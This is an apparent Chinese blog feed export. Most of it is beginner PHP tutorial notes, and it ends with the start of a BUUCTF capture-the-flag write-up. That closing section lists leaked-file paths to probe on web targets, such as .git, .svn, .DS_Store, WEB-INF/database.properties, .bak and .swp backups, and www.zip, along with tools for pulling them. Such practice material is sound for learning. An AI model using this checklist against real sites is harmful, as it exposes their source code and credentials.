<p>PHP7+版本多了一个NULL合并运算符<code>??</code><br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span> 如果 <span class="variable">$_GET</span>[<span class="string">'user'</span>] 不存在返回 <span class="string">'nobody'</span>，否则返回 <span class="variable">$_GET</span>[<span class="string">'user'</span>] 的值</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">'user'</span>] ?? <span class="string">'nobody'</span>;</span><br><span class="line"><span class="regexp">//</span> 类似的三元运算符</span><br><span class="line"><span class="variable">$username</span> = isset(<span class="variable">$_GET</span>[<span class="string">'user'</span>]) ? <span class="variable">$_GET</span>[<span class="string">'user'</span>] : <span class="string">'nobody'</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="组合比较符-PHP7"><a href="#组合比较符-PHP7" class="headerlink" title="组合比较符(PHP7+)"></a>组合比较符(PHP7+)</h2><p>PHP7+ 支持组合比较符，也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> <span class="variable">&lt;=&gt;</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>解析如下:<br>如果$a&gt;$b，则$c的值为1<br>如果$a==$b，则$c的值为0<br>如果$a&lt;$b，则$c的值为-1</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// 整型</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1</span> &lt;=&gt; <span class="number">2</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">2</span> &lt;=&gt; <span class="number">1</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 浮点型</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">1.5</span> &lt;=&gt; <span class="number">2.5</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="number">2.5</span> &lt;=&gt; <span class="number">1.5</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 字符串</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"a"</span> &lt;=&gt; <span class="string">"a"</span>; <span class="comment">// 0</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"a"</span> &lt;=&gt; <span class="string">"b"</span>; <span class="comment">// -1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"b"</span> &lt;=&gt; <span class="string">"a"</span>; <span class="comment">// 1</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.==和===很常用，可以理解为前者睁一只眼闭一只眼，后者一只都不闭</p>
<p>2.define()是PHP5版本的函数，在PHP7+之后基本上都使用在类的内部定义的常量。使用const申明定义，以后遇到类再说</p>
<p>3.intdiv()类似于取整函数,向下取整而不是四舍五入</p>
<p>4.字符串和数组一样都是以0开头计数</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/6/1-基础1</title>
    <url>/2020/06/02/PHP-2020-6-1-%E5%91%A8%E6%8A%A50/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP全称是超文本预处理器，是一种通用开源脚本语言</p>
<p>可以包含文本，HTML，JavaScript和PHP代码</p>
<p>可以用于生成动态页面内容；创建，打开，读取，写入，关闭服务器上的内容；收集表单数据，接受发送cookie等</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>PHP脚本可以放在文档中的任何位置</p>
<p>PHP脚本是以&lt;?PHP开始，以?&gt;结束</p>
<p>在PHP版本更新后，如果只是调试运行PHP程序，可以只写&lt;?PHP</p>
<p>PHP文件通常还包括了HTML标签和一些PHP脚本代码</p>
<p>例如,包含HTML标签的<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first PHP page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/周报0-0.png" alt="avatar"></p>
<p>就会在浏览器中输出Hello World!</p>
<p>也可以直接进行调试<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello World"</span>;</span></span><br></pre></td></tr></table></figure><br><img src="/img/PHP/周报0-1.png" alt="avatar"></p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>PHP的注释和C语言，HTML很想</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PHP单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PHP</span></span><br><span class="line"><span class="comment">多行</span></span><br><span class="line"><span class="comment">注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>PHP的变量以$开头</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">6</span>;</span></span><br><span class="line"><span class="php">$z=$x+$y;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z;</span></span><br></pre></td></tr></table></figure>
<p>运行结果为<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure></p>
<h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><p>PHP的变量规则与C语言很像<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">变量以<span class="variable">$符</span>号开始，后面跟着变量名称</span><br><span class="line">变量名必须以字母或者下划线字符开始</span><br><span class="line">变量名只能包含字母数字字符以及下划线</span><br><span class="line">变量名不能包括空格</span><br><span class="line">变量名区分大小写</span><br></pre></td></tr></table></figure></p>
<h2 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h2><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$txt</span>="Hello world!";</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span>=5;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$y</span>=10.5;</span></span><br></pre></td></tr></table></figure>
<p>将文本值给变量时，文本值两次加上引号</p>
<p>这里可以看出PHP是一门弱类型语言，不用提前声明好变量的类型，直接声明赋值即可</p>
<h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> 局部</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> 全局</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> 静态</span><br></pre></td></tr></table></figure>
<h3 id="global关键字"><a href="#global关键字" class="headerlink" title="global关键字"></a>global关键字</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">global</span> $x,$y;</span></span><br><span class="line"><span class="php">    $y=$x+$y;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></span></span><br></pre></td></tr></table></figure>
<p>可以看到x,y在函数外进行了声明，在函数中添加了global关键字，对其进行了运算操作</p>
<p>PHP将所有全局变量都存储在一个名为$GLOBALS[index]的数组中。index保存变量的名称，这个数组可以在函数内部访问，也可以直接用来更新全局变量</p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $GLOBALS[<span class="string">'y'</span>]=$GLOBALS[<span class="string">'x'</span>]+$GLOBALS[<span class="string">'y'</span>];</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y;</span></span><br></pre></td></tr></table></figure><br>运行结果仍为15</p>
<h3 id="static作用域"><a href="#static作用域" class="headerlink" title="static作用域"></a>static作用域</h3><p>一个函数完成时，所有的变量都会被删除，但是有时候希望某个局部变量不要被删除，就需要使用static关键字</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $x=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php">    $x++;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> PHP_EOL;    <span class="comment">// 换行符</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php">myTest();</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><br>每次调用该函数时，该变量将会保留着函数前一次被调用时的值</p>
<h3 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h3><p>参数是在参数列表中声明的，也可以作为函数声明的一部分<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">($x)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">myTest(<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果为5</p>
<p>这个类似于是C语言的带参函数</p>
<h1 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h1><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 可以输出一个或多个字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> 只允许输出一个字符串，返回值总为1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>输出的速度比<span class="built_in">print</span>快，<span class="built_in">echo</span>没有返回值，<span class="built_in">print</span>返回值为1</span><br></pre></td></tr></table></figure>
<h2 id="echo语句"><a href="#echo语句" class="headerlink" title="echo语句"></a>echo语句</h2><p>echo是一个语言结构，使用时可以不加上括号，也可以加上:echo或echo()</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello world!\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($x);</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<h2 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h2><p>和echo差不多，可以带括号也可以不带<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$x</span>=5;</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"Hello world!\n"</span>;</span><br><span class="line"><span class="builtin-name">print</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p>
<h1 id="EOF使用说明"><a href="#EOF使用说明" class="headerlink" title="EOF使用说明"></a>EOF使用说明</h1><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法</p>
<p>概述<br><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">必须后接分号，否则编译不通过</span><br><span class="line"></span><br><span class="line"><span class="built_in">EOF</span> 可以用任意其它字符代替，只需保证结束标识与开始标识一致。</span><br><span class="line"></span><br><span class="line">结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</span><br><span class="line"></span><br><span class="line">开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号</span><br><span class="line"></span><br><span class="line">当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法</span><br></pre></td></tr></table></figure></p>
<p>例如<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$name=<span class="string">"runoob"</span>;</span></span><br><span class="line"><span class="php">$a= <span class="string">&lt;&lt;&lt;EOF</span></span></span><br><span class="line"><span class="php">        <span class="string">"abc"</span>$name</span></span><br><span class="line"><span class="php">        <span class="string">"123"</span></span></span><br><span class="line"><span class="php">EOF;</span></span><br><span class="line"><span class="php"><span class="comment">// 结束需要独立一行且前后不能空格</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">"abc"</span>runoob</span><br><span class="line"><span class="string">"123"</span></span><br></pre></td></tr></table></figure></p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一个字符串是一串字符的序列，就像”Hello World”<br>可以将任何文本放在单引号和双引号中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">$x = <span class="string">'Hello world!'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x;</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">Hello world!</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></p>
<h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>整型顾名思义就是没有小数点的数字<br>规则<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">整型必须至少有一个数字(<span class="number">0</span><span class="number">-9</span>)</span><br><span class="line"></span><br><span class="line">整数不能包括逗号或空格</span><br><span class="line"></span><br><span class="line">整数是没有小数点的</span><br><span class="line"></span><br><span class="line">整数可以是正数或负数</span><br><span class="line"></span><br><span class="line">可以以十进制，十六进制(<span class="number">0</span>x开头)，八进制(<span class="number">0</span>开头)</span><br></pre></td></tr></table></figure><br>var_dump()函数可以返回变量的数据类型和值：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="number">5985</span>;</span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">-345</span>; <span class="comment">// 负数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">047</span>; <span class="comment">// 八进制数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">5985</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(-<span class="number">345</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">140</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">39</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点型是带小数部分的数字，或是指数形式<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 10.365;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 2.4e3;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 8E-5;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">10.365</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">2400</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">8.0</span>E-<span class="number">5</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><p>布尔型只有两个类型True或False<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$x=<span class="literal">true</span><span class="comment">;</span></span><br><span class="line">$y=<span class="literal">false</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>这个用于判断，流程控制</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组可以在一个变量中存储多个值<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">var_dump($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">5</span>) <span class="string">"Volvo"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">3</span>) <span class="string">"BMW"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">6</span>) <span class="string">"Toyota"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象数据类型也可以用于存储数据<br>在PHP中，对象必须声明</p>
<p>首先，你必须使用class关键字声明类对象，类可以包含属性和方法的结构</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $color;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($color=<span class="string">"green"</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;color = $color;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">what_color</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h2><p>NULL值表示变量没有值。NULL是数据类型为NULL的值</p>
<p>NULL值指明一个变量是否为空值。同样可以用于数据空值和NULL值的区别</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php">$x=<span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="literal">NULL</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.&lt;?PHP开始，以?&gt;结束，这一项在有HTML代码的时候，必须要以?&gt;结尾，调试时可以不用</p>
<p>2.PHP在版本更新之后，echo和print可以带括号，也可以不带括号</p>
<p>3.PHP是弱类型语言，不用提前声明变量的数据类型</p>
<p>4.global关键字使用时，会将声明的变量都添加到$GLOBALS[index]中</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Nepnep-WEB-1</title>
    <url>/2020/05/09/BUUCTF-Nepnep-WEB-1/</url>
    <content><![CDATA[<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开之后得到一句话：<br>Try to find out source file!</p>
<p>尝试找到源文件，所以尝试了一下source.php，但是发现404</p>
<p>接着有尝试了index.php，随后想到了文件泄露</p>
<p>也可以用御剑扫出来</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="敏感文件泄露"><a href="#敏感文件泄露" class="headerlink" title="敏感文件泄露"></a>敏感文件泄露</h3><p>常见的敏感文件泄露主要分为</p>
<h4 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">git</span></span><br><span class="line"><span class="symbol">hg</span></span><br><span class="line"><span class="symbol">svn</span></span><br><span class="line"><span class="keyword">bzr</span></span><br><span class="line"><span class="keyword">cvs</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">以上除了git，均可以使用dvcs-ripper工具来利用</span></span><br></pre></td></tr></table></figure>
<h4 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h4><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">WEB-INF</span><br><span class="line"></span><br><span class="line">.DS_Store利用方法为 XXX/.DS_Store</span><br><span class="line"></span><br><span class="line">WEB-INF：</span><br><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">WEB-INF/<span class="class"><span class="keyword">lib</span>/ : 用来存放打包好的库(.<span class="title">jar</span>)</span></span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>
<h4 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">.swp</span><br><span class="line">.bak</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar</span><br><span class="line"></span><br><span class="line">.swp和.bak利用方法为:index<span class="selector-class">.php</span>.swp(.bak)</span><br><span class="line"></span><br><span class="line">XXX/www.zip(rar,tar)</span><br></pre></td></tr></table></figure>
<p>具体参考一下这些文章<br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank" rel="noopener">https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html</a><br><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<p>dvcs-ripper工具使用方法<br><a href="https://www.codetd.com/article/9717496" target="_blank" rel="noopener">https://www.codetd.com/article/9717496</a></p>
